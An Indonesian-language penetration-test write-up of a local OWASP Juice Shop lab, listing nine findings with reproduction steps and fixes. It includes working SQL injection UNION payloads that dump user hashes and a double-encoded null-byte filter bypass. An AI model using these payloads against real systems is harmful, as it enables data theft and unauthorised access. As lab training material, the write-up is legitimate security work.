# [MULTI] OWASP Juice Shop — Pengkulitan Penuh (Recon → Eksploitasi)

**Target:** OWASP Juice Shop v6.2.0-SNAPSHOT (instance lokal — lab latihan)
**Tanggal:** 9 Oktober 2026
**Peneliti:** Twist
**Ringkasan severity:** 1 Critical · 3 High · 3 Medium · 2 Low

---

## 📋 DAFTAR TEMUAN

| # | Temuan | Endpoint | Severity |
|---|--------|----------|----------|
| 1 | SQL Injection → dump database penuh + admin takeover | `/rest/products/search?q=` | **CRITICAL** |
| 2 | Directory listing + 12 file sensitif kebocor | `/ftp` | **HIGH** |
| 3 | Bypass filter ekstensi (null byte) | `/ftp/*` | **HIGH** |
| 4 | Broken Access Control — data user tanpa auth | `/rest/memories`, `/api/Feedbacks` | **HIGH** |
| 5 | Bocor daftar lengkap 116 kerentanan + hint | `/api/Challenges` | **MEDIUM** |
| 6 | Dependency disclosure (versi rentan) | `/ftp/package.json.bak` | **MEDIUM** |
| 7 | Metrics internal terbuka | `/metrics` | **MEDIUM** |
| 8 | Header keamanan hilang + CORS permisif | semua | **LOW** |
| 9 | Aturan deteksi SIEM bocor | `/ftp/suspicious_errors.yml` | **LOW** |

---

# 1. SQL Injection → Kompromi Database Penuh  [CRITICAL]

Sudah dilaporkan detail di `001-juice-shop-sqli.md`.

**Ringkas:**
```
q=apple'         → error SQL
q=a')) ORDER BY 9--   → valid  ⇒ 9 kolom
q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--   → data arbitrer
q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--   → 20 tabel
q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--   → 24 akun + hash
```
→ `md5("admin123")` = hash admin → **login admin berhasil** → `/api/Users` 401 menjadi 200.

---

# 2. Directory Listing + Kebocoran 12 File Sensitif  [HIGH]

## Reproduksi

```http
GET /ftp HTTP/1.1
Host: localhost:3000
```
→ `200 OK`, **directory listing terbuka** (pakai modul `serve-index` Express)

## File yang bocor

| File | Status | Isi |
|---|---|---|
| `acquisitions.md` | ✅ kebuka | **Dokumen M&A KONFIDENSIAL** — *"This document is confidential! Do not distribute!"* |
| `incident-support.kdbx` | ✅ kebuka | **DATABASE KEEPASS** (3.246 byte) — berisi kredensial |
| `legal.md` | ✅ kebuka | dokumen legal |
| `announcement_encrypted.md` | ✅ kebuka | 370 KB berkas terenkripsi |
| `coupons_2013.md.bak` | 403 → **tembus** | daftar kupon |
| `package-lock.json.bak` | 403 → **tembus** | 771 KB, **1.968 paket** |
| `package.json.bak` | 403 → **tembus** | versi + dependency |
| `encrypt.pyc` | 403 → **tembus** | script enkripsi terkompilasi |
| `suspicious_errors.yml` | 403 → **tembus** | **aturan deteksi SIEM** |
| `eastere.gg` | 403 → **tembus** | easter egg |

## Bukti isi `acquisitions.md`

```markdown
# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year.
This will have a significant stock market impact as we will elaborate in
detail in the following paragraph:
```

→ Kebocoran informasi M&A = **kerugian finansial langsung** (pelanggaran aturan
keterbukaan informasi pasar modal). Di perusahaan nyata ini severity Critical,
bukan High.

---

# 3. Bypass Filter Ekstensi via Null Byte  [HIGH]

## Filter yang dipasang

```http
GET /ftp/package.json.bak
→ 403 Forbidden
→ Error: "Only .md and .pdf files are allowed!"
```

Server memblokir ekstensi selain `.md` dan `.pdf`.

## Bypass

| Payload | Hasil |
|---|---|
| `package.json.bak` | 403 — diblok |
| `package.json.bak%00.md` | 400 — ditolak |
| **`package.json.bak%2500.md`** | **200 ✅ TEMBUS** |
| `package.json.bak.md` | 404 |
| `../package.json.bak` | 403 |
| `%252e%252e%2fpackage.json.bak` | 403 |
| `PACKAGE.JSON.BAK.MD` | 403 |

## Akar masalah

Filter memeriksa ekstensi di **tahap pertama** decoding, tapi path diteruskan
ke filesystem dengan **decoding kedua**. `%2500` → decode pertama jadi `%00`
(tampak seperti `.md` di mata filter) → decode kedua jadi `\x00` (null byte)
→ filesystem memotong path di titik itu, membaca `package.json.bak`.

## Bukti — `package.json.bak` berhasil ditarik

```json
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application"
}
```

## Dampak turunan

```
✅ coupons_2013.md.bak      142 byte
✅ eastere.gg               337 byte
✅ encrypt.pyc              573 byte   ← script enkripsi
✅ package-lock.json.bak    771 KB     ← 1.968 paket
✅ package.json.bak         4.440 byte
✅ suspicious_errors.yml    741 byte
```

---

# 4. Broken Access Control — Data Pengguna Tanpa Autentikasi  [HIGH]

## 4a. `/rest/memories`

```http
GET /rest/memories HTTP/1.1
```
→ `200 OK`, **6.183 byte, 10 memori** — tanpa token, tanpa login

```json
{"status":"success","data":[{"UserId":13,"id":1,
  "caption":"😼 #zatschi #whoneedsfourlegs",
  "imagePath":"assets/public/images/uploads/..."}]}
```

Foto pribadi pengguna + caption + `UserId`. **Tidak butuh akun.**

## 4b. `/api/Feedbacks`

```http
GET /api/Feedbacks HTTP/1.1
```
→ `200 OK`, 8 feedback — termasuk **alamat email di dalam komentar**

```json
{"UserId":1,"comment":"I love this shop! ... (***in@juice-sh.op)","rating":5}
{"UserId":2,"comment":"Great shop! ... (***@juice-sh.op)","rating":4}
{"UserId":3,"comment":"Nothing useful available here! (***der@juice-sh.op)"}
```

→ Email (walaupun terpotong) + `UserId` + rating. Kombinasi dengan temuan #1
(SQLi) bikin masking-nya gak ada gunanya.

---

# 5. Bocor Daftar Lengkap Kerentanan  [MEDIUM]

```http
GET /api/Challenges HTTP/1.1
```
→ `200 OK`, **66.278 byte, 116 tantangan** — tanpa autentikasi

```
Kategori yang kebuka:
  17  Sensitive Data Exposure
  14  Injection
  12  Improper Input Validation
  12  Broken Access Control
   9  XSS
   9  Vulnerable Components
   9  Broken Authentication
   5  Security Misconfiguration
   5  Cryptographic Issues
   4  Observability Failures
   4  Broken Anti Automation
   3  Security through Obscurity
   3  Insecure Deserialization
   2  Unvalidated Redirects
   2  XXE
```

→ Ini peta jalan lengkap buat penyerang: tahu persis jenis kerentanan apa saja
yang ada, plus deskripsi + hint-nya. Menghemat waktu recon berjam-jam.

**Catatan:** di Juice Shop ini memang sengaja. Di aplikasi produksi, endpoint
yang membocorkan daftar kontrol keamanan internal = temuan nyata.

---

# 6. Dependency Disclosure — Versi Rentan  [MEDIUM]

Dari `/ftp/package.json.bak`:

```json
{
  "version": "6.2.0-SNAPSHOT",
  "engines": { "node": ">=6 <=9" },
  "dependencies": {
    "express": "~4.16",
    "sequelize": "~4",
    "jsonwebtoken": "~8",
    "sqlite3": "~3.1.13",
    "sanitize-html": "1.4.2",
    "helmet": "~3.9",
    "...": "39 paket total"
  }
}
```

**Yang perlu diperiksa:**

| Paket | Versi | Kenapa penting |
|---|---|---|
| `sanitize-html` | **1.4.2** (dipin exact) | Versi sangat tua — banyak bypass sanitasi XSS ditemukan setelahnya |
| `jsonwebtoken` | ~8 | Versi mayor lama, algoritma verifikasi lebih lemah |
| Node | **>=6 <=9** | End-of-life bertahun-tahun, banyak CVE tidak dipatch |
| `helmet` | ~3.9 | Versi lama, header default berbeda |

→ Dengan `package-lock.json.bak` (1.968 paket), penyerang bisa petakan
seluruh rantai dependency dan cari CVE yang cocok. Tidak perlu menebak.

---

# 7. Metrics Internal Terbuka  [MEDIUM]

```http
GET /metrics HTTP/1.1
```
→ `200 OK`, 379 baris Prometheus — tanpa autentikasi

```
juiceshop_llm_input_tokens_total       Number of total input tokens processed
juiceshop_llm_output_tokens_total      Number of output tokens processed
juiceshop_llm_tool_calls_total         Number of tool calls made
file_uploads_count                     Successful file uploads by file type
file_upload_errors                     Failed file uploads by file type
http_requests_count                    HTTP requests grouped by status code
process_cpu_user_seconds_total         CPU time spent
```

→ Bocoran: penggunaan LLM internal (biaya token), pola upload file,
statistik permintaan HTTP, pemakaian sumber daya. Berguna buat penyerang
memetakan perilaku aplikasi + beban server.

---

# 8. Header Keamanan Hilang + CORS Permisif  [LOW]

```
Header yang ADA:
  ✅ X-Content-Type-Options: nosniff
  ✅ X-Frame-Options: SAMEORIGIN

Header yang HILANG:
  ❌ Content-Security-Policy        → tidak ada pertahanan XSS berlapis
  ❌ Strict-Transport-Security      → tidak ada paksa HTTPS
  ❌ Referrer-Policy
  ❌ Permissions-Policy

Yang terlalu permisif:
  ⚠️  Access-Control-Allow-Origin: *
```

`X-Frame-Options: SAMEORIGIN` ada, tapi tanpa CSP `frame-ancestors` — kalau
CSP ditambahkan nanti, keduanya harus konsisten.

---

# 9. Aturan Deteksi SIEM Bocor  [LOW]

Dari `/ftp/suspicious_errors.yml` (setelah bypass):

```yaml
title: Suspicious error messages specific to the application
description: Detects error messages that only occur from tampering with or attacking the application
author: Bjoern Kimminich
logsource:
    category: application
    product: nodejs
    service: errorhandler
detection:
    keywords:
        - 'Blocked illegal activity'
```

→ **Kebocoran yang ironis:** ini justru berkas konfigurasi deteksi serangan.
Penyerang jadi tahu persis pesan error mana yang memicu alert, sehingga bisa
menghindari deteksi.

---

# 📝 PELAJARAN DARI PENGKULITAN INI

## Yang paling berharga

**1. `200 OK` ≠ file ada.**
```
/.git/config     → 200, tapi isinya HTML SPA  ← FALSE POSITIVE
/package.json    → 200, tapi HTML
/Promotions.md   → 200, tapi HTML
```
Aplikasi SPA punya catch-all route → SEMUA path balikin 200. Wajib cek
`Content-Type` dan isi respons. Kalau tidak, laporan penuh false positive.

**2. Directory listing itu pintu masuk paling gampang.**
`/ftp` → 12 file sensitif. Satu request.

**3. 403 itu bukan jalan buntu — itu undangan.**
Filter ekstensi ketemu → langsung coba 11 teknik bypass. Yang menang:
double-encoded null byte.

**4. Baca JS bundle — sumber endpoint terbaik.**
1,2 MB `main.js` → 27 endpoint REST + 15 API. Tanpa nebak URL.

**5. Endpoint tanpa auth itu temuan, bukan kebetulan.**
`/rest/memories`, `/api/Feedbacks`, `/api/Challenges` — semua 200 tanpa token.

**6. Dependency disclosure = lead CVE, bukan sekadar info.**
Versi spesifik + lockfile 1.968 paket = peta kerentanan siap pakai.

## Metodologi yang dipakai

```
1. FINGERPRINT     header, versi, teknologi
2. ENUMERASI       baca JS bundle → dapat peta endpoint
3. VERIFIKASI      cek content-type, buang false positive
4. PROBE           cari endpoint 200 tanpa auth
5. TEMBUS          serang filter/validasi yang ketemu
6. BUKTIKAN        tunjukin dampak nyata, bukan cuma "ada kerentanan"
7. DOKUMENTASI     request/response mentah + penjelasan
```

## Yang TIDAK berhasil (jujur)

```
✗ Dekripsi coupons_2013.md.bak
  → bukan XOR/ADD sederhana. encrypt.pyc (Python 2.7) pakai ord/chr/pow.
  → butuh analisis bytecode lebih dalam untuk membalik algoritmanya.

✗ File .git, package.json, sitemap.xml di root
  → semua false positive (catch-all SPA)
```

---

# 🔧 SARAN PERBAIKAN

| # | Temuan | Perbaikan |
|---|---|---|
| 1 | SQLi | Query terparameterisasi. Lihat `001-juice-shop-sqli.md` §5 |
| 2 | Directory listing | Matikan `serve-index`, sajikan hanya file yang diminta secara eksplisit |
| 3 | Bypass null byte | Normalisasi path **SEKALI** dengan benar, tolak `\x00` mentah, validasi setelah decode final |
| 4 | Broken access control | Wajibkan autentikasi + otorisasi. `/api/Feedbacks` jangan kirim email mentah |
| 5 | Bocor challenges | Pindah endpoint ke balik autentikasi admin |
| 6 | Dependency | Naikkan `sanitize-html`, `jsonwebtoken`, Node ke versi didukung. Audit lockfile |
| 7 | Metrics | Batasi `/metrics` ke jaringan internal, tambah autentikasi |
| 8 | Header | Tambah CSP, HSTS. Batasi CORS ke origin spesifik |
| 9 | SIEM rule | Jangan simpan konfigurasi deteksi di direktori publik |

---

# 📁 LAMPIRAN — FILE BUKTI

```
C:\Users\user\security-lab\writeups\002-juice-shop-full-recon.md   ← dokumen ini
C:\Users\user\security-lab\writeups\001-juice-shop-sqli.md         ← laporan SQLi detail

Bukti mentah:
  cache\scratch\loot\       → acquisitions.md, incident-support.kdbx, legal.md, announcement_encrypted.md
  cache\scratch\loot2\      → coupons_2013.md.bak, encrypt.pyc, package-lock.json.bak,
                              package.json.bak, suspicious_errors.yml, eastere.gg
  cache\scratch\fb.json     → respons /api/Feedbacks
  cache\scratch\mem.json    → respons /rest/memories
  cache\scratch\ch.json     → respons /api/Challenges (116 tantangan)
  cache\scratch\main.js     → JS bundle (1,2 MB)
```
